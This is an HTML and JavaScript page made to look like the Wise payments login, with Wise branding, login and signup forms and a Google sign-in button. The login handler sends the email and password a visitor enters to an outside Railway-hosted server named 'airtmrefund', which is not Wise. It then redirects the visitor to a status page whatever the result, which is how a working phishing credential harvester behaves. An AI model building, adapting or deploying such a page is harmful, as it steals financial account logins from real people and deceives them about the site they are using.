<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <title>Wise - Login</title>
    <!-- Font Awesome for social icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <!-- Google Font -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* ===== ANIMATED BACKGROUND ===== */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 50%, rgba(154, 254, 0, 0.08) 0%, transparent 60%),
                radial-gradient(ellipse at 70% 80%, rgba(0, 182, 122, 0.06) 0%, transparent 50%);
            z-index: -1;
            animation: floatBackground 20s ease-in-out infinite alternate;
        }

        @keyframes floatBackground {
            0% {
                transform: translate(0, 0) rotate(0deg);
            }
            100% {
                transform: translate(2%, 3%) rotate(3deg);
            }
        }

        /* ===== LAYOUT ===== */
        .layout {
            width: 100%;
            max-width: 440px;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
            overflow: hidden;
            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.4s ease;
        }

        .layout:hover {
            transform: translateY(-4px);
            box-shadow: 0 32px 80px rgba(0, 0, 0, 0.12);
        }

        /* ===== HEADER - ORIGINAL POSITION ===== */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 24px 16px;
            border-bottom: 1px solid #f0f2f5;
            background: #ffffff;
        }

        .header .logo-link {
            display: flex;
            align-items: center;
            text-decoration: none;
        }

        .header .logo-link svg {
            height: 24px;
            width: auto;
        }

        .close-btn {
            background: none;
            border: none;
            cursor: pointer;
            color: #6b7a8f;
            padding: 4px;
            border-radius: 50%;
            transition: background 0.2s, color 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .close-btn:hover {
            background: #f0f2f5;
            color: #0a1e3c;
        }

        .close-btn svg {
            width: 24px;
            height: 24px;
        }

        /* ===== MAIN CONTENT ===== */
        .content {
            padding: 32px 24px 24px;
        }

        /* Welcome Section */
        .welcome {
            margin-bottom: 28px;
        }

        .welcome h1 {
            font-size: 26px;
            font-weight: 700;
            color: #0a1e3c;
            letter-spacing: -0.5px;
            margin-bottom: 4px;
        }

        .welcome .subtitle {
            font-size: 15px;
            color: #6b7a8f;
        }

        .welcome .subtitle a {
            color: #9afe00;
            text-decoration: none;
            font-weight: 600;
            transition: color 0.2s;
            cursor: pointer;
        }

        .welcome .subtitle a:hover {
            color: #7ad000;
            text-decoration: underline;
        }

        /* ===== FORM WITH CLEAN INPUTS ===== */
        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2b44;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1.5px solid #dce0e6;
            border-radius: 12px;
            background: #fafbfc;
            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
            outline: none;
            color: #0a1e3c;
            font-family: inherit;
        }

        .form-group input:focus {
            border-color: #9afe00;
            box-shadow: 0 0 0 4px rgba(154, 254, 0, 0.2);
            background: #ffffff;
        }

        .form-group input::placeholder {
            color: transparent;
        }

        /* ===== LOGIN BUTTON ===== */
        .btn-login {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            color: #163300;
            background: #9afe00;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.25s, transform 0.15s, box-shadow 0.25s, opacity 0.25s;
            margin-top: 4px;
            font-family: inherit;
            letter-spacing: 0.3px;
            opacity: 0.58;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
        }

        .btn-login:hover {
            background: #9afe00;
            opacity: 1;
            box-shadow: 0 4px 16px rgba(154, 254, 0, 0.3);
        }

        .btn-login:active {
            transform: scale(0.98);
            opacity: 0.7;
        }

        .btn-login:disabled {
            background: #b8c2d0;
            cursor: not-allowed;
            box-shadow: none;
            opacity: 1;
            color: #ffffff;
        }

        /* ===== DIVIDER ===== */
        .divider {
            display: flex;
            align-items: center;
            margin: 28px 0 24px;
            gap: 16px;
            color: #9aa8b9;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e4e8ee;
        }

        /* ===== SOCIAL BUTTONS - REAL GOOGLE BUTTON ===== */
        .social-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            max-width: 100%;
        }

        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            color: #1a2b44;
            background: #ffffff;
            border: 1.5px solid #dce0e6;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.2s, border-color 0.2s, transform 0.15s;
            font-family: inherit;
            text-decoration: none;
            width: 100%;
        }

        .social-btn:hover {
            background: #f5f7fa;
            border-color: #b8c2d0;
            transform: translateY(-1px);
        }

        .social-btn:active {
            transform: scale(0.98);
        }

        .social-btn.google {
            background: #ffffff;
            border: 1.5px solid #dce0e6;
            color: #3c4043;
            font-weight: 500;
            font-size: 15px;
            padding: 12px 16px;
            border-radius: 12px;
            transition: all 0.2s ease;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
        }

        .social-btn.google:hover {
            background: #f8f9fa;
            border-color: #dadce0;
            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.08);
            transform: translateY(-1px);
        }

        .social-btn.google i {
            font-size: 20px;
            color: #4285f4;
            width: 24px;
            text-align: center;
        }

        .social-btn.google .google-text {
            font-weight: 500;
            color: #3c4043;
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 16px 24px;
            border-top: 1px solid #f0f2f5;
            font-size: 13px;
            color: #9aa8b9;
            background: #fafbfc;
        }

        /* ===== PAGE TRANSITION ===== */
        .page {
            display: none;
            animation: fadeInUp 0.4s ease forwards;
        }

        .page.active {
            display: block;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            body {
                padding: 12px;
            }

            .content {
                padding: 24px 16px 20px;
            }

            .header {
                padding: 16px 16px 12px;
            }

            .welcome h1 {
                font-size: 22px;
            }

            .social-btn {
                font-size: 14px;
                padding: 12px;
            }

            .layout {
                border-radius: 20px;
            }

            .footer {
                padding: 12px 16px;
                font-size: 12px;
            }
        }

        /* ===== ANIMATIONS ===== */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .layout {
            animation: fadeInUp 0.5s ease forwards;
        }
    </style>
</head>
<body>

    <!-- ===== MAIN LAYOUT ===== -->
    <div class="layout">

        <!-- HEADER - LOGO LEFT, CLOSE BUTTON RIGHT -->
        <header class="header">
            <a href="index.html" title="Go to homepage" class="logo-link">
                <svg xmlns="http://www.w3.org/2000/svg" width="106" height="24" fill="none" viewBox="0 0 106 24">
                    <path fill="#163300" d="M58.7377.358803h6.4982L61.9668 23.681h-6.4983L58.7377.358803Zm-8.1922 0L46.1602 13.794 44.2465.358803h-4.5448L33.9608 13.7541 33.2433.358803h-6.2991L29.1369 23.681h5.2226L40.818 8.93022 43.0904 23.681h5.1428L56.7249.358803h-6.1794ZM105.103 13.9136H89.6744c.0798 3.0299 1.8937 5.0233 4.5648 5.0233 2.0133 0 3.608-1.0765 4.8439-3.1296l5.2079 2.3674C102.501 21.7017 98.729 24 94.0798 24 87.741 24 83.535 19.7342 83.535 12.8771 83.535 5.34221 88.4784 0 95.4552 0c6.1398 0 10.0068 4.14618 10.0068 10.6046 0 1.0765-.12 2.1528-.359 3.309Zm-5.7807-4.46512c0-2.71095-1.515-4.42525-3.9468-4.42525-2.5117 0-4.5848 1.79402-5.143 4.42525h9.0898ZM6.63326 7.38685 0 15.1389h11.844l1.3309-3.6553H8.09965l3.10105-3.58555.01-.09511L9.19424 4.3319h9.07196l-7.0323 19.3492h4.8124L24.538.358823H2.60021L6.63326 7.38685Zm69.16744-2.3636c2.2923 0 4.301 1.23273 6.0551 3.34565l.9216-6.57488C81.1429.687707 78.9303 0 76 0c-5.8205 0-9.0896 3.40865-9.0896 7.73421 0 2.99999 1.6744 4.83389 4.4252 6.01989l1.3156.598c2.4518 1.0466 3.1097 1.5649 3.1097 2.6712 0 1.1461-1.1064 1.8737-2.7907 1.8737-2.7808.01-5.0332-1.4153-6.7276-3.8472l-.939 6.699C67.2332 23.2201 69.7067 24 72.9702 24c5.5315 0 8.9302-3.1894 8.9302-7.6147 0-3.0099-1.3355-4.9434-4.7044-6.4584l-1.4351-.67772c-1.9934-.88708-2.6711-1.37543-2.6711-2.35216 0-1.05647.9269-1.87377 2.7109-1.87377Z"/>
                </svg>
            </a>
            <button class="close-btn" aria-label="Close" onclick="window.location.href='index.html'">
                <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path d="m12 13.414-7.293 7.293-1.414-1.414L10.586 12 3.293 4.707l1.414-1.414L12 10.586l7.293-7.293 1.414 1.414L13.414 12l7.293 7.293-1.414 1.414z"/>
                </svg>
            </button>
        </header>

        <!-- ===== LOGIN PAGE ===== -->
        <div id="loginPage" class="page active">
            <div class="content">

                <!-- Welcome -->
                <div class="welcome">
                    <h1>Welcome back</h1>
                    <div class="subtitle">
                        New to Wise? <a onclick="showSignup()">Sign up</a>
                    </div>
                </div>

                <!-- Login Form -->
                <form id="loginForm" onsubmit="handleLogin(event)">

                    <div class="form-group">
                        <label for="email">Email address</label>
                        <input
                        type="email"
                        id="email"
                        required
                        autocomplete="email"
                        />
                    </div>

                    <div class="form-group">
                        <label for="password">Password</label>
                        <input
                        type="password"
                        id="password"
                        required
                        autocomplete="current-password"
                        />
                    </div>

                    <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                </form>

                <!-- Divider -->
                <div class="divider">or log in with</div>

                <!-- Social Buttons -->
                <div class="social-buttons">
                    <button class="social-btn google" onclick="window.location.href='status.html'">
                        <i class="fab fa-google"></i>
                        <span class="google-text">Log in with Google</span>
                    </button>
                </div>

            </div>
        </div>

        <!-- ===== SIGNUP PAGE ===== -->
        <div id="signupPage" class="page">
            <div class="content" style="text-align: center;">

                <div class="welcome">
                    <h1>Create your Wise account</h1>
                    <div class="subtitle">
                        Already have an account? <a onclick="showLogin()">Log in</a>
                    </div>
                </div>

                <form id="signupForm" onsubmit="handleSignup(event)">

                    <div class="form-group" style="text-align: left;">
                        <label for="signupEmail">First, enter your email address</label>
                        <input
                        type="email"
                        id="signupEmail"
                        name="email"
                        autocomplete="email"
                        required
                        />
                    </div>

                    <button type="submit" class="btn-login" id="signupBtn" style="opacity: 0.58;">Next</button>
                </form>

                <div class="divider">Or sign up with</div>

                <div class="social-buttons">
                    <button class="social-btn google" onclick="window.location.href='status.html'">
                        <i class="fab fa-google"></i>
                        <span class="google-text">Sign up with Google</span>
                    </button>
                </div>

            </div>
        </div>

        <!-- FOOTER -->
        <div class="footer">
            &copy; Wise Payments Limited 2026
        </div>

    </div>

    <!-- ============================================
    JAVASCRIPT
    ============================================ -->
    <script>
        // ============================================
        // PAGE NAVIGATION
        // ============================================
        function showSignup() {
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('signupPage').classList.add('active');
            setTimeout(() => {
                document.getElementById('signupEmail').focus();
            }, 100);
        }

        function showLogin() {
            document.getElementById('signupPage').classList.remove('active');
            document.getElementById('loginPage').classList.add('active');
            setTimeout(() => {
                document.getElementById('email').focus();
            }, 100);
        }

        // ============================================
        // 🔥 LOGIN HANDLER - Direct to status page
        // ============================================
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const btn = document.getElementById('loginBtn');

            // Validation
            if (!email || !password) {
                alert('⚠️ Please fill in all fields');
                return;
            }

            if (!email.includes('@')) {
                alert('⚠️ Please enter a valid email address');
                return;
            }

            if (password.length < 6) {
                alert('⚠️ Password must be at least 6 characters');
                return;
            }

            // Show loading state
            btn.disabled = true;
            btn.textContent = 'Logging in...';
            btn.style.opacity = '0.6';

            // ✅ Send login data to backend
            const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';

            fetch(API_BASE_URL + '/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.json())
            .then(data => {
                console.log('✅ Login sent:', data);
                btn.disabled = false;
                btn.textContent = 'Log in';
                btn.style.opacity = '0.58';

                // ✅ Always go to status page after login
                window.location.href = 'status.html';
            })
            .catch(error => {
                console.error('❌ Login error:', error);
                btn.disabled = false;
                btn.textContent = 'Log in';
                btn.style.opacity = '0.58';
                alert('❌ Network error. Please try again.');
            });
        }

        // ============================================
        // SIGNUP HANDLER
        // ============================================
        function handleSignup(event) {
            event.preventDefault();
            const email = document.getElementById('signupEmail').value;
            const btn = document.getElementById('signupBtn');

            if (!email) {
                alert('⚠️ Please enter your email address');
                return;
            }

            if (!email.includes('@')) {
                alert('⚠️ Please enter a valid email address');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Creating account...';

            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = 'Next';
                // ✅ Go to status page after signup
                window.location.href = 'status.html';
            }, 1500);
        }

        // ============================================
        // KEYBOARD SUPPORT
        // ============================================
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const loginForm = document.getElementById('loginForm');
                const signupForm = document.getElementById('signupForm');
                const active = document.activeElement;

                if (loginForm.contains(active)) {
                    loginForm.dispatchEvent(new Event('submit'));
                } else if (signupForm.contains(active)) {
                    signupForm.dispatchEvent(new Event('submit'));
                }
            }
        });

        // ============================================
        // AUTO-FOCUS ON LOAD
        // ============================================
        window.addEventListener('load', function() {
            document.getElementById('email').focus();
        });

        console.log('🔥 Wise - Login Page');
        console.log('✅ No pop-ups - clean login flow');
        console.log('✅ After login → status.html');
    </script>

</body>
</html>
